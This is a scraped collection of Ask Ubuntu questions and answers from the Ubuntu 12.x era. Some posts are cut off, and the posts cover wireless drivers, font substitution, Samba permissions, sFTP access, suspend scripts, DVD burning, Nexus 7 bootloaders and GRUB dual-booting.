If so, you may manage to solve your problem by something that worked exquisitely for me. Namely, removing your Ubuntu 12.10 via use of uninstall.exe in the file directory /ubuntu (of course backing up all your files prior to doing so) and then inserting a live CD, rebooting and booting from CD. (Pressing F12 if this option doesn't come up automatically) \nIncidentally if you need to create a live CD just install the .iso file from http://www.ubuntu.com/start-download?distro=desktop&bits=32&release=latest for 32 bit OS and http://www.ubuntu.com/start-download?distro=desktop&bits=64&release=latest for 64 bit OS and burn it to a CD with ~800MB free space. \n", "Q: Wireless 4311 card not working HELP.\nsimon@simon-Latitude-D630:~$ sudo lshw -C network\n  *-network UNCLAIMED     \n       description: Network controller\n       product: BCM4311 802.11a/b/g\n       vendor: Broadcom Corporation\n       physical id: 0\n       bus info: pci@0000:0c:00.0\n       version: 01\n       width: 32 bits\n       clock: 33MHz\n       capabilities: pm msi pciexpress bus_master cap_list\n       configuration: latency=0\n       resources: memory:fe8fc000-fe8fffff\n  *-network\n       description: Ethernet interface\n       product: NetXtreme BCM5755M Gigabit Ethernet PCI Express\n       vendor: Broadcom Corporation\n       physical id: 0\n       bus info: pci@0000:09:00.0\n       logical name: eth0\n       version: 02\n       serial: 00:1c:23:24:77:ba\n       size: 100Mbit/s\n       capacity: 1Gbit/s\n       width: 64 bits\n       clock: 33MHz\n       capabilities: pm vpd msi pciexpress bus_master cap_list ethernet physical tp 10bt 10bt-fd 100bt 100bt-fd 1000bt 1000bt-fd autonegotiation\n       configuration: autonegotiation=on broadcast=yes driver=tg3 driverversion=3.123 duplex=full firmware=5755m-v3.29 ip=10.1.1.13 latency=0 link=yes multicast=yes port=twisted pair speed=100Mbit/s\n       resources: irq:45 memory:fe7f0000-fe7fffff\n\n\nA: login ubuntu program center, \nsearch b43 find \nfirmware-b43-installer\nand instal. \nOr Look :http://forum.ubuntu-tr.net/index.php?topic=765.0\n", "Q: \"quickly run\" not working anymore The command quickly run is not working after I renamed the folder and created a new one with same name and moved the contents of the renamed folder to the new one .\nHere is the error:\nERROR: No run command found.\nCandidate commands are: commands, getstarted, help, quickly\n\n\nA: The quickly run command uses a file .quickly in the project directory.

Most things work fine except for my external monitor (Samsung SyncMaster). It is connected to my Notebook via an HDMI-D to VGA adapter (stupid combination, I know, but it's the only one I could find hardware for). \nIn /var/log/Xorg.0.log, I find for it probed modes with resolutions between 640x480 and 1280x1024, but not the one I want to use, which is 1920x1200. 1024x768 seems to be the only resolution in the EDID. I used cvt to get the modeline for 1920x1200. Output:\n# 1920x1200 59.88 Hz (CVT 2.30MA) hsync: 74.56 kHz; pclk: 193.25 MHz\nModeline \"1920x1200_60.00\"  193.25  1920 2056 2256 2592  1200 1203 1209 1245 -hsync +vsync\n\nIf I feed xrandr with these values, my monitor changes to some resolution which doesn't even fill the full screen, and is skewed and flickering (even after using the screens auto-adjust). (The maximum dot clock frequency of my screen is 175 MHz, according to /var/log/Xorg.0.log).\nI booted into Windows to get a better modeline from there, but it also didn't support other resolutions than the ones between 640x480 and 1280x1024. I connected my screen to my old laptop where it used to be working (nvidia graphic card, no adapter nedded, VGA to VGA) and got modelines there with cvt (same output as above), and under Windows -- output:\n\"1920x1200\" 153,900 1920 1968 2000 2080 1200 1203 1209 1235 +hsync -vsync\n\nThis modeline works better than the cvt one, and after some auto-adjustement of the monitor one can almost manage to fit it to the actual size of the screen, but the display is very blurry (barely sharp enough to read text).\nUsing modeline generators from the web with the data from my monitor gives things like\nModeline \"1920x1200@60i\" 87.66 1920 1952 2280 2312 1200 1227 1233 1261 interlace\n\nwhich don't even lead to output.\nHas anybody experienced similar problems, or has an idea what to do?

On a few, the time difference is noticeable (Like 10 to 15 seconds faster). This changes if I update the system. After upgrading 12.10, the changes is more noticeable for more PCs as 12.10 somehow speeds up.\nWhat I would recommend would be to remove preload, Chromium and any other non-default changes you made. Then test both. Just a FYI, preload sometimes does not make the boot part faster. This varies on the hardware/software.\nFor 40 seconds of time, I would also suggest for you to add your hardware specs here.

We need to give access to the developer to only be able upload files to one of the websites. I have installed Jailkit but can't seem to find how to give him sFTP access to the website directory.\nHere is our web directory structure:\n/var/www/website.com/htdocs/\n/var/www/someotherwebsite.com/htdocs/\n/var/www/website3.com/htdocs/\nall owned by www-data:www-data \nCan someone give me some step by steps to giving a user access to only one or two of these directories via sFTP and no ssh access?\n\nA: In general, that is not a practical directory structure for reasons you are encountering. If you only have one website, then the /var/www dirctory might be just fine. However, in my experience, 20+ years, the best approach is to create a separate home partition so that the home partition can be mounted nosuid, noexec, nodev, et al. Each website has its own system user account. That account is given a shell, rssh, which allows sftp but no ssh. This is practical when hosting, when hiring developers, or even from a security point of view.\nHaving written that much, one solution becomes clear: move the sites to user account directories and update the web server configuration. This can be done safely by creating a copy of the website on a subdomain. For example, for the domain, www.website.com, create a CNAME called test.website.com. Make sure the site on test.website.com is working. Then, update the web server config file to point www.website.com to the new location once you know it is flawless.\nAt that point, you can provide access via sFTP to whomever you please without this concern.\nBut... to get to the point and answer the question: a less obvious but effective solution is to use ACL. With ACL, you can get much better fine-grain controls on file system permissions.

When ibus is active and one, say, moves up to the menu or exits input mode, ibus switches to input method off since it no longer sees a gui element with focus and where entering text is possible. The error message you saw (\"no focused input context\") is consistent with this. Ibus stays on when you go back to the text window without having performed a command because the ibus context is still alive. The bug is that the ibus context is killed when you do perform an action and follow that with a click in the text window. You're still in insert mode, but the ibus context is dead, you need to turn ibus on again. This doesn't happen in programs like LibreOffice.\nI imagine the bug comes from the way vim uses a special insert mode rather than a standard gui event model. Clicking in a text window would normally set the focus on the text area, but here it doesn't. To make it work we need an add-on like ibus-el for emacs. I'm not sure where you should file a bug for this.\nFor a work around, I think the best thing to do is set a shortcut to enable ibus in the ibus preferences. From the ibus menu > preferences > General tab > enable box. A good one seems to be Ctrl-p since that is right next to the i for enabling input mode and the [ you may be using to exit input mode. I keeps you fingers in the same area. When you're back in the text area, a quick flick with you fingers is much easier than moving the mouse up and clicking twice.\n", "Q: Can't ping external websites I can't ping google.com with my virtual ubuntu 12.04 server. \nI have set up a proxy URL in my /etc/apt/apt.conf file and it says\nAquire::http::proxy http://urlname.com:9999;\nNow, I don't know a lot about how the proxy works, but I do know when we use it on windows VMachines it's a pac script that we place in internet explorer LAN settings and it automatically detects the script and gives internet access. \nI tried including the 9999/proxy.pac in the apt.conf URL and it didn't seem to work any better. \nWould ubuntu know how to handle a proxy.pac assuming it was created for windows? Should my URL include the .pac or just end after the port numbers? I've tried both without sucess, but I would like to know.\nA quick test to ping a fellow co-workers' PC was sucessful. So I can see network computers, but not google. or other internet sources. \n\nA: As far as I'm aware apt doesn't handle PAC files directly. But this file is nothing more than plain text describing the location of your proxy. The Wikipedia page for Proxy auto-config has some details. So I would suggest downloading the PAC file to your computer, open it in a text editor and try to find out the correct URL for your proxy. You can enter this information into the /etc/apt/apt.conf and this should work.\nOther software might have seperate ways to handle PAC files. Firefox for instance has network settings. There you can enter the URL to the PAC file.\n", "Q: SIP Phones unreliable past 12.04 - Empathy additional features?

I had to apt-get install ttf-mscorefonts-installer on Ubuntu 12.04/12.10. The short version is I need to pipe PDF files out of an application that requires these fonts for certain glyphs.\nThe problem, after running this command, is that the fonts in my web browser (and some java apps) are now \"ugly.\" Obviously this is a subjective opinion but it is the one I hold. \nI want the old fonts back for most cases (Liberation, DejaVu, Ubuntu, ...). I'm not sure how best to describe this but here's an example:\nExample CSS in Webbrowser\nfont-family: Verdana,Arial,sans-serif;\nWithout ttf-mscorefonts-installer (Case 1):\n    $ fc-match Verdana\n    LiberationSans-Regular.ttf: \"Liberation Sans\" \"Regular\"\n\n    $ fc-match Arial\n    LiberationSans-Regular.ttf: \"Liberation Sans\" \"Regular\"\n\n    $ fc-match sans-serif\n    LiberationSans-Regular.ttf: \"Liberation Sans\" \"Regular\"`\n\nWith ttf-mscorefonts-installer (Case 2):\n    $ fc-match Verdana\n    Verdana.ttf: \"Verdana\" \"Normal\"\n\n    $ fc-match Arial\n    Arial.ttf: \"Arial\" \"Normal\"\n\n    $ fc-match sans-serif\n    LiberationSans-Regular.ttf: \"Liberation Sans\" \"Regular\"`\n\nI want (Case 1). Optionally, I want the fonts in (Case 2) not to look \"ugly\" IE. they are more jagged, less smooth than their free alternatives in my web browsers.\nIs this possible?\n\nA: fontconfig employs a complete set of font substitution systems. There are different levels of font definition: font name and font families. Given a specific font, fontconfig uses the font of the same name if available, then seeks otherwise the font family of the same name. If there is still no match, it uses the standard font family definition as substitution, i.e. Sans, Sans-serif and Mono.\nUbuntu has the font family 'Verdana' defined in `/etc/fonts/conf.d/45-latin.conf', where 'Verdana' is set default to 'Sans-serif', which means Sans-serif is employed for 'Verdana' by default. But 'Verdana.ttf' would be used instead if it's installed.\nIn your system, the preferred font in the Sans-serif family is 'Liberation Sans', so fontconfig uses the 'Liberation Sans' as substitution for 'Verdana' provided there is no font of the same name, whereas uses 'Verdana.ttf' if it's in the search path. This explains what you've posted.\nSo the solution to your problem is that, you have to remap the font 'Verdana' to a different font, or to a group of fonts which assigns to 'Liberation Sans' the highest priority. (The latter case is recommended)\nOpen or create the file ~/.config/fontconfig/fonts.conf, append following:\n<?xml version=\"1.0\"?>\n<!DOCTYPE fontconfig SYSTEM \"fonts.dtd\">\n<fontconfig>\n\n<match>\n    <test name=\"family\"><string>Verdana</string></test>\n    <edit name=\"family\" mode=\"prepend\" binding=\"strong\">\n        <string>Liberation Sans</string>\n        <string>Verdana</string>\n    </edit>\n</match>\n\n</fontconfig>\n\nNote that ~/.fonts.conf is deprecated now, and if you already have user-defined fonts.conf, remove the header and footer and only keep the 'match' section. And it would be too long-winded to demonstrate the same workaround on 'Arial'. I'm sure you can find it on your own.\n", "Q: Can't install acroread - 'dpkg returned an error code (1)' After running sudo apt-get install acroread, I got the following output\nReading package lists...

When my laptop battery is critically low, Ubuntu/Xfce4 performs some action (perhaps hibernate?) which causes my laptop to shut down.\nHowever when I start it again, it never comes up. I don't even get BIOS or anything on the screen, it is completely black. The only way to get it back up is to take it apart, remove the internal CMOS battery as well as the main battery, wait a few minutes, and put it back together.\nObviously this is not optimal.\nHow do I disable all actions when the battery is critically low? I would rather have it run out of power, than ending up in this error condition.\n\nA: I have no idea how to do it for XFCE but for GNOME, you can change it by installing dconf-tools. Open dconf-editor Go to:\norg > gnome > settings-daemon > plugins > power\nand edit critical-battery-action value to nothing.\nYou can also un-check use-time-for-policy. Then your system won't use the time remaining as the criteria. It will be forced to use the percentage remaining. Takes care of a bug in ACPI.\nThere should be something similar for XFCE.\n\nA: go to power settings and choose \" power off\" for the option of when power is critically low\n", "Q: Tab key doesn't work Since a couple of days, my Tab key doesn't work. \nAlt + Tab works fine. For example in a text editor it does nothing, but for example in a form in the browser it blinks/focuses the field but it doesn't jump to the next field of the form. It works fine in my dual-boot Windows installation.\nAny ideas as to what is causing this and how to fix it?\n\nA: Well I have found the solution.\nI had autokey installed and it was conflicting with the system. I was sure that I had disable it before to test this but it looks like it was not disabled at all.\nswift, your response has helped me understand the problem, so i will give the bounty to you. Thanks.\n\nA: Such conflict or just override can be possible if you use global sharing of your shortcut layouts between applications. Try to check Keyboard Shortcuts in System Settings and your IBus Preferences.  \nIf we talk about Firefox, then also, I was checked - Tab key shortcut preference in FF not exist, however it works, because it's common typing feature.  \nSo, if your layout have shared in global, then Tab key mapped at some app just can't to find their command in other app or just work with error or catch.\n", "Q: Preventing applications from being closed on terminal exit When I close a terminal it closes all programs opened from it.

I am working on Kazam screen recorder and one of the options of the program is recording an arbitrary area of the screen.\nFor this, I open a GtkWindow and let user resize it and move it around the screen to the desired location. The problem is when user wants to resize the window over the Panel (or Launcher). It can't be done. It seems that window manager is preventing this.\nI can move the window under panel and launcher if I ALT-drag it, but the problem because area selection window stays below Launcher and Panel.\nAny ideas are more than welcome.\n\nA: Edit your window roll. You can use ccsm to force window rolls, but your going to have to play with them to get ones that will work. \nYou could also auto-hide the sidebar, but that does nothing for the top panel. \nOther then that it's not really going to happen though. You wouldn't want to not be able to reach your panel/side bar ever.\n\nA: Did you try to use gtk_window_set_type_hint()? You should try 'GDK_WINDOW_TYPE_HINT_SPLASHSCREEN'.

In order to downgrade to gnome 3.6, you will have to purge the ricotz/testing ppa with sudo ppa-purge ppa:ricotz/testing.  Then you will have to reinstall gnome shell from the standard gnome3 repository (ppa:gnome3-team/gnome3).  Note that at the moment, the content of these two repositories is roughly the same as gnome 3.6 came out less than a month ago.\n\nA: When using ppa:ricotz/testing you are suppose to use the provided gnome-shell-extensions package which contains the official extensions compatible with the latest upstream (dev-)releases.\nAlso remove the manually installed extensions which collide with them in the package to make sure you are actually using the compatible ones.\n", "Q: Terminal broken?

I’m on Ubuntu 12.10 and I’ve seen that I can use\nsudo dpkg-reconfigure keyboard-configuration\n\nto control which key triggers the dead key behaviour on my keyboard (which normally resides on AltGr). I would like to use both Alt as well as AltGr to type dead keys.\nHowever, when I select Both Alt Keys in the Key to function as AltGr step, the alt-tab application switcher shortcut stops working, presumably because the key combo is swallowed by whatever controls text input. Is there any way to make both work, since there is no dead key on tab?\n\nA: Short answer: Unfortunately, you can't.\nLong answer: Technically, if you change the left alt's function, you would have to also alter the Application switcher's keyboard shortcut to something that doesn't use the alt keys.\nFinally, I don't know if you're aware that you can also use the System Settings > Keyboard Layout > Options... to edit all kinds of keyboard layout related stuff.\n", "Q: Are Halo: Combat Evolved and Minecraft compatible with Ubuntu? How to transfer files from Windows to Ubuntu? When installing Ubuntu, I got the Install alongside Windows 7 option. Is there a possible way of me being able to transfer a file from my Windows 7 installation to Ubuntu? Also, are Halo: Combat Evolved and Minecraft compatible with Ubuntu?\n\nA: Ubuntu can mount your Windows 7 partition, so simply clicking and dragging from the windows partition to the ubuntu partition within ubuntu should allow you to 'transfer' the file.\nMinecraft is written in JAVA and thus runs natively in almost every OS, including Ubuntu.\nHalo supposedly runs pretty well in WINE.\n\nA: Minecraft is java based, so yes. Java is cross platform, and there is a java for Ubuntu.\nHalo Combat evolved, well WineHQ claims that it's working with wine.\nSo yes on both questions.\nAnd with transfering the files, just mount your disk and drag & drop the files.\n\nA: In response to your question about moving files, yes you can. Just save the file somewhere on the Windows partition and then from the Ubuntu side, browse to it in Nautilus.\nMinecraft is just a Java file. Just search around this site and you'll find instructions to run it.\nIn order to run games meant for windows, you'll want to use Wine. As for Halo, you can see here that it has a gold rating. Shoot [no pun intended] for versions 1.08 or higher since it doesn't have a CD activation bug.\n\nA: In response to Minecraft, the Ubuntu Software Center has a couple applications for launching Minecraft. I've not tried any of them, but you can see them by searching for \"Minecraft\".\nWhat I found was MC-Launcher ($2.99 USD) and Mini Minecraft Launcher ($4.00 USD)\n", "Q: Apt BADSIG error (Ubuntu Archive Automatic Signing Key) while updating I'm trying to update package's repository but APT gives me this error:\nW: Errore GPG: http://it.archive.ubuntu.com precise Release: Le seguenti firme non erano valide: BADSIG XXXXXXXXXXXXXXXX Ubuntu Archive Automatic Signing Key\n <ftpmaster@ubuntu.com>\n\nThe Ubuntu Archive Automatic Signing Key is not valid.

I use it mainly for number crunching, doing higher performance computations that consume lots of memory and CPU, and also read and write disk a lot. I will mainly work in Ubuntu. \nSo the obvious solution for hard drive partition is just let the whole disk to be a single ext4 partition. But I am also thinking about the pros and cons of other solutions with some size of NTFS partition for two reasons: (1) the disk may have errors because of future intensive disk read and writing, instead of using 1T monolithic partition, should I partition the disk into several smaller partitions, so that I can fix the disk errors within a smaller partition more quickly? (2) I might want to install a windows system to use some software that don't have good counter parts in Ubuntu, say Office, though I can install a virtual machine instead. \nWhat would you suggest to partition the hard drive given my purpose? What are the pros and cons?\nThanks,\nJeff\n\nA: Consider using the Logical Volume Manager. The Enterprise Volume Management System was (years ago) another alternative, but LVM is now integrated into the kernel and is very easy to use once you learn about it.\nYou may also want to consider using the JFS filesystem rather than the ones you mention. I've been using it for more than 5 years through several power outages and journal recovery has always recovered my filesystem with zero errors and no lost data. I think JFS is a wonderful filesystem.\n\nA: You should at least create a seperate /home partition. This allows you to remove and exchange the linux operating system without having to back up and restore any personal data or personal desktop configuration. I think reserving about 20Gig for the remaining system partition would be sufficient.\nIf you are working with software RAID or LVM etc. you will also need a seperate /boot partition from which the OS kernel can be loaded before RAID and LVM are initialized. About 500Meg are more than sufficient here.\nAnother parts of the filesystem tree which is often put to a seperate partition is /var since this contains log files, database files, caches etc. Data which can grow in volume without your direct interaction. Should this data fill up your root filesystem, you might run into trouble using your system. Putting the folder to a seperate partiton, obviously prevents this.\n/srv is sometimes externalised because it is supposed to store bulk data for services. I.e. all the video files for your multimedia streaming service, or whatever, files which don't belong directly to the system. You have to decide if you want to do this or not.\nUse LVM to be more flexible when altering partitions later. It enables you to extend a partition to another hard drive or to continue one partition after a second one without moving any data. Growing partitions can always be easily done in retrospect, shrinking them is sometimes tricky (but often not that difficult either).\nIn any case I would strongly recommend having your home partition seperated from the OS. You will find this useful in the future. And of course you might or might not want to have a swap partition.\n", "Q: Ubuntu 12.10 and Gnome-Shell : can't see nor launch apps except with Alt + F2 I've installed Ubuntu 12.10 and Gnome-Shell 3.6. \nEverything worked fine till the moment I've began to customize the main menu (apps wich appears in Dash and so on). \nI don't know wether I've done something wrong or if there is a bug : suddenly, the Dash became empty.

Now I'm running low on hard drive space and need the 40 gig or so of space I partitioned for Ubuntu back.\nAny help is appreciated, and thanks in advance!\n\nA: Go to this website:\nhttp://partedmagic.com/doku.php\nDownload the ISO appropriate to your CPU architecture and burn it to a disc.\nBoot from it.\nDelete the partition allocated to Ubuntu via GParted.\nResize your Windows partition to fill your drive.\nBTW If there is still an option to boot into Ubuntu, you will have to boot into your Windows CD that you have and do something, although I am unsure of what - Google is your freind.\n", "Q: How do I install tun/tap on Ubuntu 10.04?

I'm running on Ubuntu Server 12.04. I have a folder called Music and I want the default folder permissions to be 775 and the default file to then be 664.\nI set the default permissions on the Music folder to be 775.\nI configured ACL to use these default permissions as well:\n# file: Music\n# owner: kris\n# group: kris\n# flags: ss-\nuser::rwx\ngroup::rwx\nother::r-x\ndefault:user::rwx\ndefault:group::rwx\ndefault:other::r-x\n\nI also changed the default umask for my user account, kris, to 002 in .profile.\nShouldn't and new file/folder now use those permissions when writing to the Samba share? ACL should work with Samba from what I can gather.\nCurrently, if I write to that folder using my mac, folders are getting 755 and files 644. I have another app on my mac called GoodSync which which is able to sync a local directory on my mac to a network samba share, but those permissions are even worse. files are being written as 700 using that program.\nSo it looks like Samba is allowing the host/program to determine the folder/file permissions.\nWhat changes do I need to make to force the permissions I want regardless of what the host tries to write on the server?\n\nA: Finally figured this one out.\nYou need to modify the /etc/samba/smb.conf file. For my Music share, I added the following options:\ncreate mask = 664\nforce create mode = 664\nsecurity mask = 664\nforce security mode = 664\ndirectory mask = 2775\nforce directory mode = 2775\ndirectory security mask = 2775\nforce directory security mode = 2775\n\nI'm not sure which one of those actually fixed the issue, but it is writing the correct permissions now when sharing via Samba. I think it's the \"force\" command being used since the Mac is likely trying to force it's own permissions on the share (and now Ubuntu is forcing it's own permissions instead of accepting my Mac's). Hopefully that helps someone!\n\nA: The following entries worked for me:\nforce security mode = 664\nforce directory security mode = 775\n\n\nA: SAMBA/UMASK\nRunning Ubuntu 14.04, samba Version 4.1.6-Ubuntu. I was previously running Fedora 16/samba3 and everything was OK. With Ubuntu/samba4, I could not get Samba to set group write bit on directories.\nsmb.conf parameters (for testing) included:\ncreate mask = 700             # The file AND mask  \nforce create mode = 775       # The file OR mask  \ndirectory mask = 700          # Directory AND mask  \nforce directory mode = 777    # Directory OR mask  \n\nFrom Windows 7 client, I could create files with mode=775, but created directories always had mode 755.\nThe problem is with default \"UMASK 022\" on my personal login which I use to access the shared directories. Edited /etc/login.defs and changed \"UMASK 022\" to \"UMASK 002\". Rebooted, and now directories created from Windows 7 client have mode=775. I do not believe this was the same behavior as my previous setup (Fedora/Samba3).\nInterestingly, smb.conf parameter \"inherit permissions = yes\" kind of worked. This parameter supersedes the previous parameters. With parent directory having mode=2777, created subdirectories had mode=766 (the execute bits weren't set), and files had mode=755 (the group/guest write bits weren't set).\nThe Samba/UMASK interaction and interdependency should be documented.\n\nA: One simple note.\nLook for \"obey pam restrictions\" parameter. By default it is OFF or NO or FALSE, but should it be turned ON explicitly, and the umask takes effect!\nI lost about a week, trying to figure out why my files created with 744 permissions regadless of force create mode 666 or 777...\nProblem was in this paramater turned ON, and I can't remember why I did that. Turning it OFF solved the rw-vs-ro problem\n", "Q: Banding with intel HD 4000 I just installed 12.10 on a mid-2012 13\" Macbook Pro and I've noticed that gradients on-screen exhibit slight banding problems.

The same happen when running pm-suspend.\nI'm running Ubuntu 12.10 64-bit with Jupiter installed for managing the performance, if that's of any help.\n\nA: Since it has nvidia ion graphics, have you tried enabling the proprietary drivers? In case you decide to do so, make sure you install linux-headers-generic before anything and in hardware drivers, select nvidia proposed updates rather than the other one.\n\nA: The problem seems to be to do with the usb host controllers regarding suspending and resuming as temporarily editing /proc/acpi/wakeup, as noted on Ubuntuforums, might sometimes enable successful suspending of the ASUS 1201N.\nHowever, to implement a permanent solution you would probably need to create a custom suspend script or try the script from here. It has been said to work with the 1201N on that site and on this forum, but you just need to change DRIVERS=\"ehci xhci\" to DRIVERS=\"ehci ohci\" in the body of the first script on the site. I've also posted the edited script from the site in a pastebin slot in case the original site becomes unavailable.\nSo, create a file such as this one (the title doesn't matter, but must be prefixed with at least 20 to override any other files):\nsudo touch /etc/pm/sleep.d/20_custom_usb \n\nand refer to the the pastebin copy of the script, which has the changed DRIVERS section. Now open your new file and copy the contents of the script into it with:\nsudo nano /etc/pm/sleep.d/20_custom_usb\n\nThen make it executable with \nsudo chmod 755 /etc/pm/sleep.d/20_custom_usb\n\nYou can then restart your machine and then test to see if it suspends correctly. This method has been said to work on that site, as the comments on the forums testify, and is definitely worth trying.\nOther than that, it may be a bug with the kernel you are using, although that is unlikely.

Following path is set by me in .bashrc file:\nexport PATH=${PATH}:$usr/bin/gsutil\n\nand firstly I had set it to:\nexport PATH=${PATH}:$HOME/vishal/Downloads/gsutil/gsutil\n\n\nA: As noted at https://stackoverflow.com/questions/7989741/how-to-configure-gsutil, the \"No command was given\" message is returned by the program gsutil in the Ubuntu package gsutil. That is not the Google Cloud Storage utility, but an older program to \"configure and manage GrandStream BudgeTone 100 VOIP and GS2000 phones.\" This is mentioned in a prominent \"Warning\" in a red box on the Google help page that you link to.\nAlthough you could probably fix this problem by configuring your PATH correctly (so that the Google gsutil is found before the gsutil from the Ubuntu package), if you don't have a \"BudgeTone\" phone, you can also simply uninstall the Ubuntu package gsutil.\n\nA: The program gsutil needs some more arguments to run. So gsutil alone will not produce anything helpfuk, except the output you pasted.  So i.e. to upload your PNG photos issue the command\ngsutil cp *.png gs://my_pngs\n\nJust have a look at the gsutil Reference Guide. This document explains how you should use gsutil.\nBut also your definition of the $PATH seems not correct. You wrote:\nexport PATH=${PATH}:$usr/bin/gsutil\n\nHave you really set a variable $usr? I assume you want to use the directory /usr. If this is your intention you should substitute the $ and write a / instead. The second questions that comes into mind is: Is /usr/bin/gsutil a directory? I assume this is your executable file. So your definition will not work anyway. If you try to enter echo $PATH you will see that /usr/bin is already defined as part of your path. So gsutil will be called like any other program and there is no need setting the PATH variable.\n\nA: Rather than downloading and installing from the Internet I strongly recommend to use the package management inbuilt to Ubuntu.\nThis makes sure that applications are tested to run on your distribution version, and it also makes sure that applications are installed in the appropriate place in the file system. It also lets you easily remove the application in case you don't need it any more.\nTo do so search for an application in the Ubuntu Software Center.\nBelow is a link to install gsutil on your system via the Ubuntu package management:\n\nAlternatively you may click here on the shopping bag right to gsutil \nOnly rarely you may have to add a ppa as a software source from where you know you can install an application that is not available otherwise.\nOnly as a last resort we may also install application from their source code or from an installation program that may be offered (e.g. in case of closed source software).

I thought 12pt should look the same in every environment (on the same hardware).\n\n\nI'm using an LCD, so my font settings under gnome-tweak-tool are:\n\n\n*\n\n*Hinting: slight\n\n*Antialiasing: RGBA\n\n\nHere are my DPI settings (same under Fluxbox and Unity):\nmisha@misha-lmd:~$ xdpyinfo | grep -B2 resolution\nscreen #0:\n  dimensions:    1280x1024 pixels (382x302 millimeters)\n  resolution:    85x86 dots per inch\n\nEDIT\nProblem solved after editing .Xresources.  Before:\n\nAfter:\n\n\nA: This looks like a different handling of font hinting/aliasing from Fluxbox vs. GNOME/Unity. \n\nWarning: The following is for experiences users only!\n\nAccording to the Fluxbox Wiki (untested as we do not run Fluxbox here) we can define font settings by creating a ~/.Xresources file in our HOME where font rendering can be defined with the following entries (amongst many others):\n[...]\n Xft.antialias:                 true\n Xft.hinting:                   true\n Xft.hintstyle:                 hintfull\n Xft.rgba:                      rgb\n[...]\n\nTo take effect we run\nxrdb ~/.Xresources\n\nDisclaimer: we have no own experience whether an additinoal .Xresources file also affects our GNOME/Unity XServer settings. Therefore do apply these settings with care. Update any pre-existing settings before you change anything as wrong X-server settings may render your X-display unusuable.\n\nA: It seems that gnome terminal (I suposse thats what you're using) has some font configuration in preferences that adds shades, because thats the only difference I can tell from the pictures.\n", "Q: Custom status Byobu #! /bin/sh\necho \"$(byobu ls|grep attached)\"|sed 's/\\([a-zA-Z0-9][a-zA-Z0-9]*\\).*/\\1/'\n\nthis is my script in ~/.byobu/bin/\nrefresh time is 1 second.\nThis shows the session name as the custom status,but it does so for all but 1 session.In place of showing the session name it shows ]0 for that session.\nIs it some issue with the echo command ?\n\nA: The problem  can be found  when you do Byobu ls |grep attached >> ~/byobu_out.\nWhen you cat this file the output is normal i.e\nsession1name:details \nsession2name:details\n\nbut when you open it in vi then you see that the file is like this:\n^[]0;[user@host](x.x.x.x)] - byobu^Gsession1name:details\nsession2name:details\n\nSo when you pass this output through sed it stops at ]0.\nTo overcome this use tail -c +x [filename] to see the output, where x is the number of byte of the junk header.\nAlso the junk header is nothing but the title of the window of the byobu terminal.\n", "Q: Screen brightness keys don't work I read the same problems but I didn't find an answer.\nI can change my brightness by slider in \"brightness and lock\" but when I press the key button it goes to lowest level and when I press the other button it just become lighter just one level and I just can switch between this two dark levels.\nIs there anyway I can repair it without changing it manually?\n\nA: If anyone's still watching this post, I found an answer to this question and posted an answer here:\nCannot change brightness\nHope this helps.\n", "Q: Cannot burn iso image to DVD using any burner I tried to burn iso image to DVD using my Laptops DVD writer, but I am unable to do so.\nI am using Ubuntu 10.10 and have used brasero, gnomebaker and acetoneiso burner.

forwarded by Libburn and Brasero. I understand it indicates that the medium does not allow the drive to make laser beam experiments in a specially reserved area called PCA.\nMost drives make such experiments if they do not find the particular medium product code in their internal database.\nSo best try a different medium. If the problem persists then it is likely a defect of the drive.\nIf this is a DVD-RW medium, then you could try to format it\ne.g. by\ndvd+rw-format -force /dev/sr0\n\nor\nxorriso -outdev /dev/sr0 -format full\n\nor\ncdrskin -v dev=/dev/sr0 blank=format_overwrite\n\nIn the hope that the drive will make the PCA re-usable.\nI assume Brasero will not perform multi-session on formatted DVD-RW. But a first session should work. A DVD-RW can be brought back into unformatted state by\ndvd+rw-format -blank=full /dev/sr0\n\nxorriso -outdev /dev/sr0 -blank all\n\ncdrskin -v dev=/dev/sr0 blank=all\n\n", "Q: How to install Windows games on Ubuntu?

(In practice, not strictly legally. Can I bring the re-flashed device back to the store and pretend it's original?)\n\n*Can I re-lock the bootloader?\n\n*Are there 'fuses' or tamper detection switches that tell that there was once something else installed?\n\n*Do I loose features in Android if I once unlocked the bootloader or installed Ubuntu (like being able to play DRMed videos)?\n\n\nA: I have been assured from Google that as long as you do the following, the warranty will be honored. Flash stock android back on the device (as described in the wiki at http://wiki.ubuntu.com/Nexus7/Installation), and re-lock the bootloader, by placing the device in fastboot mode, plugging into your computer, and running fastboot oem lock\nThere should be zero issues at this point, it will be as if you just bought a new device.\n\nA: Installing Ubuntu on Nexus7 does not require rooting the phone.  It does require unlocking the boot loader which will void your warranty as stated on the device when you unlock it.  You can re-lock it later, but unfortunately I don't know if there are any counters that that will be able to use to detect you've tampered with it.  \nEDIT: chris-wayne who is on my team at Canonical called Google and they stated on the phone that unlocking your bootloader, installing something, then reflashing back to stock and re-locking will NOT void your warranty. We unfortunately don't have this in writing, but it is encouraging to hear.\n\nA: I found a way of completely removing touch from my N7. All you need is MultiROM installed on your device.

However, I still don't have a convenient method of choosing what OS to load at boot time.\nAfter installing Ubuntu, my computer still loads Windows 8 directly. I then added grubx64.efi to the white list of my boot loader. But after that, my machine loads Ubuntu directly without even a shadow of GRUB showing up!\nI used boot-repair and I got this paste.ubuntu URL: paste.ubuntu.com/1326074. After running boot-repair (and re-white listing the grubx64.efi file), GRUB now shows up but without any Windows 8 option!\nLastly, I ran sudo fdisk -l and it gave me this:\nWARNING: GPT (GUID Partition Table) detected on '/dev/sda'! The util fdisk doesn't support GPT. Use GNU Parted.\n\n\nDisk /dev/sda: 750.2 GB, 750156374016 bytes\n255 heads, 63 sectors/track, 91201 cylinders, total 1465149168 sectors\nUnits = sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 4096 bytes\nI/O size (minimum/optimal): 4096 bytes / 4096 bytes\nDisk identifier: 0x6396389f\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sda1               1  1465149167   732574583+  ee  GPT\nPartition 1 does not start on physical sector boundary.\n\nI'm guessing my problem has something to do with the warning from fdisk above but I don't know what to do with it.

